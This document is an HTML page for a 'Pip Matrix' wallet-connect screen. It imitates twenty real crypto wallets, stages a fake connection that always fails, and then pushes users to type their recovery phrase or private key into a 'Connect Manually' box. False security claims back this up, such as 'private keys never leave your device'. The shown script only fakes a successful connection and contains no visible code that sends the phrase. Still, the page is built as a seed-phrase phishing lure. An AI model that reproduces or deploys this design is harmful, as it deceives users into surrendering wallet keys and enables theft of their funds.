<!DOCTYPE html>
<html lang="en" x-data="walletApp()" :class="{ 'dark': true }" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet - Pip Matrix</title>
    <link href="https://remedyalgotradescript.sbs/storage/app/public/photos/Px9MifdF6k4uRiyRSGBX6qi4kKWtbhpkYNQrAouw.png" rel="icon" type="image/x-icon" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                    },
                    colors: {
                        primary: {
                            50: '#eef2ff',
                            100: '#e0e7ff',
                            200: '#c7d2fe',
                            300: '#a5b4fc',
                            400: '#818cf8',
                            500: '#6366f1',
                            600: '#4f46e5',
                            700: '#4338ca',
                            800: '#3730a3',
                            900: '#312e81',
                        }
                    }
                }
            }
        }
    </script>
    
    <style>
        [x-cloak] { display: none !important; }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        
        @keyframes fadeOut {
            from { opacity: 1; transform: scale(1); }
            to { opacity: 0; transform: scale(0.95); }
        }
        
        .animate-spin-slow {
            animation: spin 2s linear infinite;
        }
        
        .animate-pulse-slow {
            animation: pulse 2s ease-in-out infinite;
        }
        
        .modal-enter {
            animation: fadeIn 0.3s ease-out forwards;
        }
        
        .modal-leave {
            animation: fadeOut 0.2s ease-in forwards;
        }
        
        .wallet-card {
            transition: all 0.3s ease;
        }
        
        .wallet-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        .connected-glow {
            box-shadow: 0 0 20px rgba(34, 197, 94, 0.4);
        }
    </style>
</head>

<body class="bg-gray-900 text-gray-100 min-h-screen font-sans">
    <!-- Header -->
    <header class="bg-gray-900/95 backdrop-blur-xl border-b border-gray-800 sticky top-0 z-40">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <a href="DASHBOARD.html" class="flex items-center gap-3">
                    <img src="images/LOGO.jpeg" alt="Pip Matrix" class="h-8 w-8 rounded-lg">
                    <span class="text-xl font-bold bg-gradient-to-r from-indigo-400 to-blue-400 bg-clip-text text-transparent">Pip Matrix</span>
                </a>
                <a href="DASHBOARD.html" class="inline-flex items-center gap-2 px-4 py-2 text-gray-400 hover:text-white transition-colors">
                    <i data-lucide="arrow-left" class="w-4 h-4"></i>
                    Back to Dashboard
                </a>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        <!-- Title Section -->
        <div class="text-center mb-8 sm:mb-12">
            <div class="inline-flex items-center gap-2 px-4 py-2 bg-indigo-500/10 border border-indigo-500/20 rounded-full mb-4">
                <div class="w-2 h-2 bg-indigo-400 rounded-full animate-pulse"></div>
                <span class="text-indigo-400 text-sm font-medium">Secure Connection</span>
            </div>
            <h1 class="text-3xl sm:text-4xl lg:text-5xl font-bold text-white mb-4">Connect Your Wallet</h1>
            <p class="text-gray-400 text-base sm:text-lg max-w-2xl mx-auto">
                Select your preferred wallet to connect securely. All connections are encrypted and protected.
            </p>
        </div>

        <!-- Search Box -->
        <div class="max-w-md mx-auto mb-8">
            <div class="relative">
                <i data-lucide="search" class="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500"></i>
                <input 
                    type="text" 
                    x-model="searchQuery"
                    placeholder="Search wallets..."
                    class="w-full pl-12 pr-4 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20 transition-all"
                >
            </div>
        </div>

        <!-- Wallets Grid -->
        <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4 sm:gap-6">
            <template x-for="wallet in filteredWallets" :key="wallet.name">
                <div 
                    @click="openWalletModal(wallet)"
                    class="wallet-card relative bg-gray-800/50 hover:bg-gray-800 border border-gray-700 hover:border-indigo-500/50 rounded-2xl p-4 sm:p-6 cursor-pointer group"
                    :class="{ 'connected-glow border-green-500': wallet.connected }"
                >
                    <div class="flex flex-col items-center text-center">
                        <div class="w-14 h-14 sm:w-16 sm:h-16 mb-3 relative">
                            <img :src="wallet.logo" :alt="wallet.name" class="w-full h-full rounded-xl object-cover bg-gray-700">
                            <div x-show="wallet.connected" class="absolute -top-1 -right-1 w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                                <i data-lucide="check" class="w-3 h-3 text-white"></i>
                            </div>
                        </div>
                        <h3 class="font-semibold text-white text-sm sm:text-base mb-1" x-text="wallet.name"></h3>
                        <template x-if="wallet.connected">
                            <span class="text-xs text-green-400 font-medium">Connected</span>
                        </template>
                        <template x-if="!wallet.connected">
                            <span class="text-xs text-gray-500 group-hover:text-indigo-400 transition-colors">Click to connect</span>
                        </template>
                    </div>
                    <div class="absolute top-2 right-2">
                        <div class="w-2 h-2 rounded-full" :class="wallet.connected ? 'bg-green-400' : 'bg-gray-600'"></div>
                    </div>
                </div>
            </template>
        </div>

        <!-- Security Info -->
        <div class="mt-12 bg-gray-800/30 border border-gray-700 rounded-2xl p-6">
            <div class="flex flex-col sm:flex-row items-center gap-4 text-center sm:text-left">
                <div class="p-3 bg-green-500/10 rounded-xl">
                    <i data-lucide="shield-check" class="w-8 h-8 text-green-400"></i>
                </div>
                <div>
                    <h3 class="text-lg font-semibold text-white mb-1">Bank-Grade Security</h3>
                    <p class="text-gray-400 text-sm">All wallet connections use end-to-end encryption. Your private keys never leave your device.</p>
                </div>
            </div>
        </div>
    </main>

    <!-- Wallet Modal -->
    <div 
        x-show="showModal" 
        x-cloak
        class="fixed inset-0 z-50 flex items-center justify-center p-4"
        @keydown.escape.window="closeModal()"
    >
        <!-- Backdrop -->
        <div 
            class="absolute inset-0 bg-black/70 backdrop-blur-sm"
            @click="closeModal()"
            x-show="showModal"
            x-transition:enter="transition ease-out duration-300"
            x-transition:enter-start="opacity-0"
            x-transition:enter-end="opacity-100"
            x-transition:leave="transition ease-in duration-200"
            x-transition:leave-start="opacity-100"
            x-transition:leave-end="opacity-0"
        ></div>

        <!-- Modal Content -->
        <div 
            class="relative bg-gray-900 border border-gray-700 rounded-2xl shadow-2xl w-full max-w-md overflow-hidden"
            x-show="showModal"
            x-transition:enter="transition ease-out duration-300"
            x-transition:enter-start="opacity-0 scale-95"
            x-transition:enter-end="opacity-100 scale-100"
            x-transition:leave="transition ease-in duration-200"
            x-transition:leave-start="opacity-100 scale-100"
            x-transition:leave-end="opacity-0 scale-95"
        >
            <!-- Modal Header -->
            <div class="flex items-center justify-between p-4 sm:p-6 border-b border-gray-800">
                <div class="flex items-center gap-3">
                    <img :src="selectedWallet?.logo" :alt="selectedWallet?.name" class="w-10 h-10 rounded-xl bg-gray-700">
                    <div>
                        <h3 class="font-semibold text-white" x-text="selectedWallet?.name"></h3>
                        <p class="text-xs text-gray-400">Wallet Connection</p>
                    </div>
                </div>
                <button @click="closeModal()" class="p-2 hover:bg-gray-800 rounded-lg transition-colors">
                    <i data-lucide="x" class="w-5 h-5 text-gray-400"></i>
                </button>
            </div>

            <!-- Modal Body -->
            <div class="p-4 sm:p-6">
                <!-- Security Badge -->
                <div class="flex items-center justify-center gap-2 mb-6 text-sm text-gray-400">
                    <i data-lucide="lock" class="w-4 h-4 text-green-400"></i>
                    <span>This session is secured and encrypted</span>
                </div>

                <!-- Loading State -->
                <div x-show="modalState === 'loading'" class="text-center py-8">
                    <div class="inline-flex items-center justify-center w-16 h-16 mb-4">
                        <div class="w-12 h-12 border-4 border-indigo-500/30 border-t-indigo-500 rounded-full animate-spin-slow"></div>
                    </div>
                    <p class="text-white font-medium mb-2">Starting secure connection...</p>
                    <p class="text-gray-400 text-sm animate-pulse-slow">Please wait...</p>
                    <div class="mt-4 flex items-center justify-center gap-2">
                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce" style="animation-delay: 0ms;"></div>
                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce" style="animation-delay: 150ms;"></div>
                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce" style="animation-delay: 300ms;"></div>
                    </div>
                </div>

                <!-- Error State -->
                <div x-show="modalState === 'error'" class="text-center py-6">
                    <div class="inline-flex items-center justify-center w-16 h-16 bg-red-500/10 rounded-full mb-4">
                        <i data-lucide="alert-circle" class="w-8 h-8 text-red-400"></i>
                    </div>
                    <p class="text-white font-medium mb-2">An error occurred...</p>
                    <p class="text-gray-400 text-sm mb-6">Please try again or connect manually.</p>
                    
                    <div class="flex flex-col sm:flex-row gap-3">
                        <button 
                            @click="retryConnection()"
                            class="flex-1 inline-flex items-center justify-center gap-2 px-4 py-3 bg-gray-800 hover:bg-gray-700 text-white rounded-xl font-medium transition-colors"
                        >
                            <i data-lucide="refresh-cw" class="w-4 h-4"></i>
                            Try Again
                        </button>
                        <button 
                            @click="showManualConnect()"
                            class="flex-1 inline-flex items-center justify-center gap-2 px-4 py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl font-medium transition-colors"
                        >
                            <i data-lucide="edit-3" class="w-4 h-4"></i>
                            Connect Manually
                        </button>
                    </div>
                </div>

                <!-- Manual Connect State -->
                <div x-show="modalState === 'manual'" class="py-4">
                    <div class="mb-4">
                        <label class="block text-sm font-medium text-gray-300 mb-2">Recovery Phrase or Private Key</label>
                        <textarea 
                            x-model="recoveryPhrase"
                            rows="4"
                            placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your private key instead."
                            class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20 transition-all resize-none text-sm"
                        ></textarea>
                    </div>
                    
                    <button 
                        @click="connectWallet()"
                        :disabled="!recoveryPhrase.trim()"
                        class="w-full inline-flex items-center justify-center gap-2 px-4 py-3 bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-700 hover:to-blue-700 disabled:from-gray-700 disabled:to-gray-700 disabled:cursor-not-allowed text-white rounded-xl font-medium transition-all shadow-lg"
                    >
                        <i data-lucide="link" class="w-4 h-4"></i>
                        Connect
                    </button>
                    
                    <p class="text-xs text-gray-500 text-center mt-4">
                        Your recovery phrase is encrypted and never stored on our servers.
                    </p>
                </div>

                <!-- Connecting State -->
                <div x-show="modalState === 'connecting'" class="text-center py-8">
                    <div class="inline-flex items-center justify-center w-16 h-16 mb-4">
                        <div class="w-12 h-12 border-4 border-blue-500/30 border-t-blue-500 rounded-full animate-spin-slow"></div>
                    </div>
                    <p class="text-white font-medium mb-2">Connecting...</p>
                    <p class="text-gray-400 text-sm">Establishing secure connection to your wallet</p>
                </div>

                <!-- Connected State -->
                <div x-show="modalState === 'connected'" class="text-center py-8">
                    <div class="inline-flex items-center justify-center w-16 h-16 bg-green-500/10 rounded-full mb-4">
                        <i data-lucide="check-circle" class="w-10 h-10 text-green-400"></i>
                    </div>
                    <p class="text-white font-medium text-xl mb-2">Connected!</p>
                    <p class="text-gray-400 text-sm mb-6">Your wallet has been successfully connected.</p>
                    
                    <button 
                        @click="closeModal()"
                        class="inline-flex items-center justify-center gap-2 px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-xl font-medium transition-colors"
                    >
                        <i data-lucide="check" class="w-4 h-4"></i>
                        Done
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function walletApp() {
            return {
                searchQuery: '',
                showModal: false,
                selectedWallet: null,
                modalState: 'loading',
                recoveryPhrase: '',
                connectionTimeout: null,
                
                wallets: [
                    { name: 'Trust Wallet', logo: 'https://trustwallet.com/assets/images/media/assets/trust_platform.png', connected: false },
                    { name: 'MetaMask', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/800px-MetaMask_Fox.svg.png', connected: false },
                    { name: 'Coinbase Wallet', logo: 'https://www.coinbase.com/apple-touch-icon.png', connected: false },
                    { name: 'WalletConnect', logo: 'https://walletconnect.com/walletconnect-logo.png', connected: false },
                    { name: 'Phantom', logo: 'https://phantom.app/img/phantom-logo.svg', connected: false },
                    { name: 'Ledger', logo: 'https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png', connected: false },
                    { name: 'Exodus', logo: 'https://www.exodus.com/img/logos/exodus-logo-square-light.png', connected: false },
                    { name: 'Rainbow', logo: 'https://rainbow.me/favicon.ico', connected: false },
                    { name: 'Argent', logo: 'https://www.argent.xyz/favicon.ico', connected: false },
                    { name: 'Binance Wallet', logo: 'https://public.bnbstatic.com/image/cms/blog/20230413/fca29911-83c4-4847-8c5f-e1c569644ecd.png', connected: false },
                    { name: 'Crypto.com', logo: 'https://crypto.com/favicon.ico', connected: false },
                    { name: 'Trezor', logo: 'https://trezor.io/static/images/trezor-logo-black.png', connected: false },
                    { name: 'SafePal', logo: 'https://www.safepal.com/favicon.ico', connected: false },
                    { name: 'BitPay', logo: 'https://bitpay.com/img/wallet-logos/bitpay.png', connected: false },
                    { name: 'Atomic Wallet', logo: 'https://atomicwallet.io/favicon.ico', connected: false },
                    { name: 'Zengo', logo: 'https://zengo.com/favicon.ico', connected: false },
                    { name: 'Blockchain.com', logo: 'https://www.blockchain.com/favicon.ico', connected: false },
                    { name: 'Electrum', logo: 'https://electrum.org/favicon.ico', connected: false },
                    { name: 'Mycelium', logo: 'https://wallet.mycelium.com/favicon.ico', connected: false },
                    { name: 'Jaxx Liberty', logo: 'https://jaxx.io/favicon.ico', connected: false }
                ],
                
                get filteredWallets() {
                    if (!this.searchQuery.trim()) return this.wallets;
                    const query = this.searchQuery.toLowerCase();
                    return this.wallets.filter(w => w.name.toLowerCase().includes(query));
                },
                
                openWalletModal(wallet) {
                    this.selectedWallet = wallet;
                    this.modalState = 'loading';
                    this.recoveryPhrase = '';
                    this.showModal = true;
                    
                    this.connectionTimeout = setTimeout(() => {
                        this.modalState = 'error';
                    }, 10000);
                    
                    this.$nextTick(() => lucide.createIcons());
                },
                
                closeModal() {
                    this.showModal = false;
                    if (this.connectionTimeout) {
                        clearTimeout(this.connectionTimeout);
                        this.connectionTimeout = null;
                    }
                },
                
                retryConnection() {
                    this.modalState = 'loading';
                    if (this.connectionTimeout) {
                        clearTimeout(this.connectionTimeout);
                    }
                    this.connectionTimeout = setTimeout(() => {
                        this.modalState = 'error';
                    }, 10000);
                },
                
                showManualConnect() {
                    if (this.connectionTimeout) {
                        clearTimeout(this.connectionTimeout);
                        this.connectionTimeout = null;
                    }
                    this.modalState = 'manual';
                    this.$nextTick(() => lucide.createIcons());
                },
                
                connectWallet() {
                    if (!this.recoveryPhrase.trim()) return;
                    
                    this.modalState = 'connecting';
                    
                    setTimeout(() => {
                        this.modalState = 'connected';
                        
                        const walletIndex = this.wallets.findIndex(w => w.name === this.selectedWallet.name);
                        if (walletIndex !== -1) {
                            this.wallets[walletIndex].connected = true;
                        }
                        
                        this.$nextTick(() => lucide.createIcons());
                    }, 5000);
                },
                
                init() {
                    this.$nextTick(() => lucide.createIcons());
                }
            }
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            lucide.createIcons();
        });
    </script>
</body>
</html>
